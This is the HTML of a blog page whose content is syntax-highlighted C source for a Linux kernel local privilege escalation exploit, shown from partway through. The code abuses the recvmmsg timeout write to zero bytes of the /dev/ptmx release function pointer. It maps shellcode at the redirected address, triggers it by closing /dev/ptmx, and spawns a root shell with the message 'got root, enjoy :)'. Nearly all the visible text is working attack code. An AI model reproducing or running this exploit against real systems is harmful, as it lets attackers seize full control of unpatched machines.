  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">bind</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sockfd</span><span style="color:#89ddff;">, (</span><span style="font-style:italic;color:#c792ea;">struct</span><span style="color:#82aaff;"> sockaddr </span><span style="color:#89ddff;">*) &amp;</span><span style="color:#82aaff;">sa</span><span style="color:#89ddff;">, sizeof(</span><span style="color:#82aaff;">sa</span><span style="color:#89ddff;">)) == -</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">bind()</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">EXIT_FAILURE</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">(&amp;</span><span style="color:#82aaff;">msgs</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, sizeof(</span><span style="color:#82aaff;">msgs</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
  iovecs</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">iov_base </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> buf</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  iovecs</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">iov_len </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> BUFSIZE</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  msgs</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_hdr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_iov </span><span style="color:#89ddff;">= &amp;</span><span style="color:#eeffff;">iovecs</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  msgs</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_hdr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">msg_iovlen </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/*</span><span style="font-style:italic;color:#4a4a4a;">
  * start a seperate process to send a udp message after 255 seconds so the syscall returns,</span><span style="font-style:italic;color:#4a4a4a;">
  * but not after updating the timout struct and writing the remaining time into it.</span><span style="font-style:italic;color:#4a4a4a;">
  * 0xff - 255 seconds = 0x00</span><span style="font-style:italic;color:#4a4a4a;">
  */</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">clearing byte at 0x</span><span style="color:#eeffff;">%lx</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> addr</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  pid </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">fork</span><span style="color:#89ddff;">();</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">pid </span><span style="color:#89ddff;">== </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">buf</span><span style="color:#89ddff;">, 0x</span><span style="color:#f78c6c;">41</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> BUFSIZE</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">((</span><span style="color:#eeffff;">sockfd </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">socket</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">AF_INET</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> SOCK_DGRAM</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> IPPROTO_UDP</span><span style="color:#89ddff;">)) == -</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">socket()</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">EXIT_FAILURE</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
    sa</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_family </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> AF_INET</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
    sa</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_addr</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">s_addr </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">htonl</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">INADDR_LOOPBACK</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    sa</span><span style="color:#89ddff;">.</span><span style="color:#eeffff;">sin_port </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">htons</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">port</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">waiting 255 seconds...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">for </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">= </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;"> i </span><span style="color:#89ddff;">&lt; </span><span style="color:#f78c6c;">255</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;"> i</span><span style="color:#89ddff;">++) {</span><span style="color:#eeffff;">
      </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">i </span><span style="color:#89ddff;">% </span><span style="color:#f78c6c;">10 </span><span style="color:#89ddff;">== </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
        </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#eeffff;">%i</span><span style="color:#c3e88d;">s/255s</span><span style="color:#89ddff;">\n&quot;,</span><span style="color:#82aaff;"> i</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">sleep</span><span style="color:#89ddff;">(</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">waking up parent...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">sendto</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">sockfd</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> buf</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> BUFSIZE</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, &amp;</span><span style="color:#82aaff;">sa</span><span style="color:#89ddff;">, sizeof(</span><span style="color:#82aaff;">sa</span><span style="color:#89ddff;">));</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">EXIT_SUCCESS</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">} </span><span style="font-style:italic;color:#c792ea;">else if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">pid </span><span style="color:#89ddff;">&gt; </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    retval </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">syscall</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">__NR_recvmmsg</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> sockfd</span><span style="color:#89ddff;">, &amp;</span><span style="color:#82aaff;">msgs</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, (</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">*)</span><span style="color:#82aaff;">addr</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#eeffff;">retval </span><span style="color:#89ddff;">== -</span><span style="color:#f78c6c;">1</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">address can&amp;#39;t be written to, not a valid timespec struct</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
      </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">EXIT_FAILURE</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">waitpid</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">pid</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">byte zeroed out</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">} </span><span style="font-style:italic;color:#c792ea;">else </span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">perror</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">fork()</span><span style="color:#89ddff;">&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">EXIT_FAILURE</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#82aaff;">main</span><span style="color:#89ddff;">(</span><span style="font-style:italic;color:#c792ea;">int </span><span style="color:#f78c6c;">argc</span><span style="color:#89ddff;">, </span><span style="font-style:italic;color:#c792ea;">char</span><span style="color:#89ddff;">** </span><span style="color:#f78c6c;">argv</span><span style="color:#89ddff;">)</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">{</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">long</span><span style="color:#eeffff;"> code</span><span style="color:#89ddff;">,</span><span style="color:#eeffff;"> target</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">int</span><span style="color:#eeffff;"> pwn</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* Prepare payload... */</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">preparing payload buffer...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  code </span><span style="color:#89ddff;">= (</span><span style="font-style:italic;color:#c792ea;">long</span><span style="color:#89ddff;">)</span><span style="color:#82aaff;">mmap</span><span style="color:#89ddff;">((</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">*)(</span><span style="color:#82aaff;">TTY_RELEASE </span><span style="color:#89ddff;">&amp; 0x</span><span style="color:#f78c6c;">000000fffffff000</span><span style="font-style:italic;color:#c792ea;">LL</span><span style="color:#89ddff;">),</span><span style="color:#82aaff;"> PAYLOADSIZE</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">7</span><span style="color:#89ddff;">, 0x</span><span style="color:#f78c6c;">32</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memset</span><span style="color:#89ddff;">((</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">*)</span><span style="color:#82aaff;">code</span><span style="color:#89ddff;">, 0x</span><span style="color:#f78c6c;">90</span><span style="color:#89ddff;">,</span><span style="color:#82aaff;"> PAYLOADSIZE</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  code </span><span style="color:#89ddff;">+=</span><span style="color:#eeffff;"> PAYLOADSIZE </span><span style="color:#89ddff;">- </span><span style="color:#f78c6c;">1024</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">memcpy</span><span style="color:#89ddff;">((</span><span style="font-style:italic;color:#c792ea;">void</span><span style="color:#89ddff;">*)</span><span style="color:#82aaff;">code</span><span style="color:#89ddff;">, &amp;</span><span style="color:#82aaff;">kernel_payload</span><span style="color:#89ddff;">, </span><span style="color:#f78c6c;">1024</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/*</span><span style="font-style:italic;color:#4a4a4a;">
  * Now clear the three most significant bytes of the fops pointer</span><span style="font-style:italic;color:#4a4a4a;">
  * to the release function.</span><span style="font-style:italic;color:#4a4a4a;">
  * This will make it point into the memory region mapped above.</span><span style="font-style:italic;color:#4a4a4a;">
  */</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">changing kernel pointer to point into controlled buffer...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  target </span><span style="color:#89ddff;">=</span><span style="color:#eeffff;"> PTMX_FOPS </span><span style="color:#89ddff;">+</span><span style="color:#eeffff;"> FOPS_RELEASE_OFFSET</span><span style="color:#89ddff;">;</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">zero_out</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">target </span><span style="color:#89ddff;">+ </span><span style="color:#f78c6c;">7</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">zero_out</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">target </span><span style="color:#89ddff;">+ </span><span style="color:#f78c6c;">6</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">zero_out</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">target </span><span style="color:#89ddff;">+ </span><span style="color:#f78c6c;">5</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#4a4a4a;">/* ... and trigger. */</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">releasing file descriptor to call manipulated pointer in kernel mode...</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  pwn </span><span style="color:#89ddff;">= </span><span style="color:#82aaff;">open</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">/dev/ptmx</span><span style="color:#89ddff;">&quot;, &amp;</span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">39</span><span style="color:#89ddff;">;</span><span style="color:#82aaff;">r</span><span style="color:#89ddff;">&amp;</span><span style="color:#82aaff;">#</span><span style="color:#f78c6c;">39</span><span style="color:#89ddff;">;);</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">close</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">pwn</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">if </span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">getuid</span><span style="color:#89ddff;">() != </span><span style="color:#f78c6c;">0</span><span style="color:#89ddff;">) {</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">failed to get root :(</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
    </span><span style="color:#82aaff;">exit</span><span style="color:#89ddff;">(</span><span style="color:#82aaff;">EXIT_FAILURE</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
  </span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span><span style="color:#eeffff;">
  </span><span style="color:#82aaff;">printf</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">got root, enjoy :)</span><span style="color:#89ddff;">\n&quot;);</span><span style="color:#eeffff;">
  </span><span style="font-style:italic;color:#c792ea;">return </span><span style="color:#82aaff;">execl</span><span style="color:#89ddff;">(&quot;</span><span style="color:#c3e88d;">/bin/bash</span><span style="color:#89ddff;">&quot;, &quot;</span><span style="color:#c3e88d;">-sh</span><span style="color:#89ddff;">&quot;, </span><span style="color:#f78c6c;">NULL</span><span style="color:#89ddff;">);</span><span style="color:#eeffff;">
</span><span style="color:#89ddff;">}</span><span style="color:#eeffff;">
</span></code></pre></div>


  <div class="post-footer">

  
    <div class="post-tags">
    
      <!-- <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all&#x2F;">#all</a> -->
    
    </div>
  
  
    <div class="post-nav">
    
      <a class="previous" href="https:&#x2F;&#x2F;xjump.me&#x2F;20140405-android-jni&#x2F;">‹ Android &amp; JNI reference</a>
    
    
      <a class="next" href="https:&#x2F;&#x2F;xjump.me&#x2F;20140910-object-c-cpp1x-singleton&#x2F;">ObjC &amp; Swift &amp; C++1x Singleton ›</a>
    
    
    
    </div>
  

  </div>


</article>

      </div>
    </main>



  </div>


<script type="text/javascript" src="/even.js"></script>

</body></html>
